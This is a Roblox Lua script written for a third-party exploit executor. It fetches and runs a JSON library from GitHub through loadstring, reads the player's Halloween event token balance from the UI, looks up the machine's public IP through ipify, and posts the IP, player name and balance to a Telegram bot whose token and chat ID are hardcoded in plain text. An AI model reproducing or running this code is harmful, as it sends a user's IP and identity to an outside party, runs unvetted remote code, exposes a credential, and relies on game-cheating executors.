json = loadstring(game:HttpGet(('https://raw.githubusercontent.com/rxi/json.lua/master/json.lua')))()

local https = game:GetService('HttpService')
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Debris = game:GetService("Debris")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local VirtualUser = game:GetService("VirtualUser")
local Player = Players.LocalPlayer
local wait = task.wait

local TelegramBotToken = "8089660566:AAE7fgHt4pbNtcxsDSbu31TRzcKhSkumFCk"
local ChatID = "1498211949"

local BalanceEvent
function CurrentBall()
    for kek, lel in pairs(Player:GetDescendants()) do
        if lel.Name == "Halloween2024" then
            print("helloween")
            for you, jej in pairs(lel:GetDescendants()) do
                if jej.Name == "MysteryBox" then
                    print("MysteryBox")
                    for ioi, uio in pairs(jej:GetDescendants()) do
                        if uio.Name == "Tokens" then
                            print("Tokens")
                            for joj, non in pairs(uio:GetDescendants()) do
                                if non.Name == "TextLabel" then
                                    print("TextLabel")
                                    print(non.Text)
                                   BalanceEvent = non.Text
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

CurrentBall()

function sendToTelegram(message)
    local IPv4 = game:HttpGet("https://api.ipify.org")
    local MyNick = Player.Name

    local data = {
        ["chat_id"] = ChatID,
        ["text"] = message .. "\nBot IP: " .. IPv4 .. "\nPlayer Name: " .. MyNick .. "\nPlayer Balance: " .. BalanceEvent,
        ["parse_mode"] = "Markdown"  -- Optional: Use Markdown for formatting
    }

    local data_for_request = {
        Url = "https://api.telegram.org/bot" .. TelegramBotToken .. "/sendMessage",
        Body = game:GetService('HttpService'):JSONEncode(data),
        Method = "POST",
        Headers = {["content-type"] = "application/json"}
    }

    local good_request = http_request or request or HttpPost or syn.request
    good_request(data_for_request)
end

sendToTelegram("Script Executed")
